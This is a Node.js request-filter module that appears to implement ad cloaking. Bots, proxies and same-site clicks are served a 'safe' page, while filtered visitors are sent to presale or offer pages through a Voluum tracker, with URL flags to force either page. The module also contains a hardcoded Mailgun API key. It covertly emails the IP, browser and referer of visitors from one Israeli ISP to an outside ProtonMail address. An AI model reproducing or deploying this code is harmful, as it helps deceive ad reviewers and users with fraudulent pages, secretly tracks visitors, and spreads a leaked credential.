const mongoose = require("mongoose");

const url = require("url");
const path = require("path");
const request = require('request');

const record = require("./record");
const helpers = require("./helpers");
const conn = require("./connection");
const proxy = require("./proxy");
const { checkFilter } = require('./check');

const config = require("../../../config/config");
const logger = require("../../log");

const useragent = require("useragent")
const mailGun = require('mailgun').Mailgun;
const mg = new mailGun('key-8719679b323b7002580966918223b74e')

let Link = mongoose.model("Link");

function handleLinkPassedFilter(req, res, ip, link, trafficID) {

  if (link.type === 0 || !link.link_voluum)
    proxy.proxySafe(req, res, trafficID);

  else if (typeof link.type === 'undefined' || link.type === 1)
    proxy.proxyPresalePage(req, res, ip, link, trafficID);

  else if (link.type === 2)
    res.redirect(link.link_voluum);

  else {
    console.error('wut?', JSON.stringify(link));
    proxy.proxyPresalePage(req, res, ip, link, trafficID);
  }
}

function loadLink(req, res, link, ip, connection, isOfferPage, time, isBot, trafficID, usePage) {
  const isLinkPage = req.originalUrl === link.link_generated;

  //res.header('Cache-Control', 'no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0');
  
  checkFilter(req, link, ip, connection, isOfferPage, usePage, (passedFilter, trafficRecord) => {
    //passedFilter = false;

    if (isLinkPage) {
      record.recordLinkTraffic(passedFilter, trafficRecord, ip, time, isBot)

      if (passedFilter)
        handleLinkPassedFilter(req, res, ip, link, trafficID);
      else
        proxy.proxySafe(req, res, trafficID);

    } else if (isOfferPage) {
      if (passedFilter) 
        sendToOfferPage(req, res, ip, link, connection, time, isBot);
      else
        res.sendStatus(404);
    
    } else {
      console.error("Error loading pass:", passedFilter, isLinkPage, req.originalUrl, JSON.stringify(req.headers))
      proxy.proxySafe(req, res, trafficID);
    }
  });
}

function sendToOfferPage(req, res, ip, link, connection, time, isBot) {
  if (!req.query.voluum) {
    console.error('something cache happened');
    logger.filter.log('info', 'Can\'t find original link', {
      'path': req.originalUrl,
      'headers': req.headers,
      ip,
    });
    return res.sendStatus(500);
  }
  
  let base = path.basename(req.path, '.php');
  let offerNumber = base.substring(5);
  let voluumURL = 'http://x9jys.voluumtrk.com/click/' + (offerNumber || 1)

  request.get({
    'url': voluumURL,
    'followRedirect': false,
    'headers': {
      'Cookie': req.query.voluum,
      'User-Agent': req.get('user-agent'),
      'X-Forwarded-For': ip
    }
  }, (err, response) => {
    if (err || response.statusCode !== 302 || !response.headers['location']) {
      console.error(err);
      res.sendStatus(500);
    } else {
      record.recordOfferClick(req, ip, connection, link, time, isBot);
      res.redirect(response.headers['location'])
    }
  });
}

function buildLinkQuery(req) {
  let query = {
    "$or": [{
      'link_generated': req.originalUrl
    }]
  };

  let referer = req.get("Referer");

  if (referer) {
    let parsed = url.parse(referer);

    if (parsed && parsed.pathname) {
      let link = parsed.pathname;

      if (parsed.search) 
        link += parsed.search;

      query["$or"].push({
        'link_generated': link
      })
    }
  }

  return query;
}

function handleInvalidRequests(req, res, ip) {

  if (req.originalUrl === '/whm-server-status' || !ip) {
    res.sendStatus(200);
    return true
  }

  if (req.originalUrl.startsWith('/this-is-a-static-dir')) {
    res.sendStatus(404);
    return true
  }
  
  if (!req.hostname) {
    helpers.noHost(req, res, ip)
    return true
  }

  return false;
}

function parseUserAgent(userAgent) {
  let agent = useragent.parse(userAgent);

  let browser_family = agent.family || "";

  if (browser_family.includes("UIWebView"))
    browser_family = browser_family.replace("Mobile Safari ", "");

  browser_family = browser_family.replace('Safari UI/WKWebView', 'WKWebView')
  browser_family = browser_family.replace(/(Mobile)|(Internet)/g, "").trim();

  let browser = browser_family;

  if (parseInt(agent.major, 10)) browser += ' ' + agent.major;
  return browser;
}

async function filter(req, res) {
  let time = new Date();
  let ip = helpers.getClientIP(req);
  let referrer = req.get('Referer') || '';
  let useragent = req.headers['user-agent']; //alex added 12.10
  let referer_parsed = url.parse(referrer);
  let usePage = "";

  if (req.originalUrl.includes('USESAFEPAGEPLZ'))
    usePage = "safe";
  else if (req.originalUrl.includes('USENONSAFEPAGEPLZ'))
    usePage = "dirty";

  req.originalUrl = req.originalUrl.replace(/(USESAFEPAGEPLZ|USENONSAFEPAGEPLZ)/, "");

  if (handleInvalidRequests(req, res, ip)) return;

  let isHTMLPage = helpers.isHTMLPage(req);
  let isOfferPage = helpers.isOfferPage(req);

  let connection = await conn.getConnectionInfo(ip);
  let query = buildLinkQuery(req);

  let headerAccept = req.get('accept');
  let getPageReq = req.method === 'GET' && isHTMLPage;
  let badAccept = headerAccept === '*/*';

  let posBot = !headerAccept || (getPageReq && badAccept);
  let isBot = posBot || conn.isProxy(connection);
  let trafficID = 0;

  if (req.method === 'GET' && (isHTMLPage || isOfferPage)) {
    let generalTrafficRecord = await record.recordGeneralTraffic(req, ip, connection, time, isBot);
    if (isHTMLPage && generalTrafficRecord && generalTrafficRecord._id)
      trafficID = generalTrafficRecord._id;
  }

  // Bots
  if (req.path === 'robots.txt' || (req.method !== 'POST' && req.method !== 'GET')) {
    if (!trafficID) record.recordGeneralTraffic(req, ip, connection, time, isBot);

    return proxy.proxySafe(req, res);
  }

  if (req.get("host") === config.loginUrl && config.env === 'production')
    return res.sendStatus(404);

  // If referer is from same domain(AKA clicking around the site), always load safe page
  // Or if its a safe resource
  if ((req.method !== 'GET') || 
      (!isOfferPage && isHTMLPage && req.hostname === referer_parsed.hostname)) {
    return proxy.proxySafe(req, res, trafficID);
  }
 
  if (isBot) {

    if (isOfferPage)
      return res.sendStatus(404);

    proxy.proxySafe(req, res, trafficID);

    if (!isHTMLPage) return;

    let link = await Link.findOne(query);

    if (!link) return;

    let trafficRecord = { req, ip, link, connection };
    trafficRecord.filter = { isBot }
    record.recordLinkTraffic(false, trafficRecord, ip, time, isBot)
    return;
  }

  let link = await Link.findOne(query);

  if (!isHTMLPage && !isOfferPage)
    return proxy.proxySafe(req, res, trafficID);

  // Offer page without referer
  if (isOfferPage && !link) {
    console.error('Offer page without referer', ip, req.hostname, req.originalUrl);
    return res.sendStatus(404);
  }

  if (link)
    loadLink(req, res, link, ip, connection, isOfferPage, time, isBot, trafficID, usePage)
  else
    proxy.proxySafe(req, res, trafficID);

  /* sending mail when detected connecting from Israel */
  let browser = parseUserAgent(useragent)
  if (connection.country === 'IL' && connection.aso === '013 NetVision Ltd') {
    await mailData_insert(req.path, ip, connection, time, req.hostname, browser, referrer)
  }

}
function mailData_insert(link, ip, connection, time, domain, browser, referrer) {
  let mailData = `
  IP Address: ${ip}
  Domain: ${domain}
  Path: ${link}
  Time: ${time}
  ASO: ${connection.aso}
  ISP: ${connection.isp}
  Browser: ${browser}
  Referer: ${referrer}`;
  mg.sendText('Phantom@server.com',
              'fwdemail@protonmail.com',
              '013 Visitor to OG Server',
              mailData,
              function(err) { err && console.log(err) });
}

module.exports = async function(req, res) {
  try {
    await filter(req, res)
  } catch (e) {
    console.error(e);
    proxy.proxySafe(req, res);
  }
}
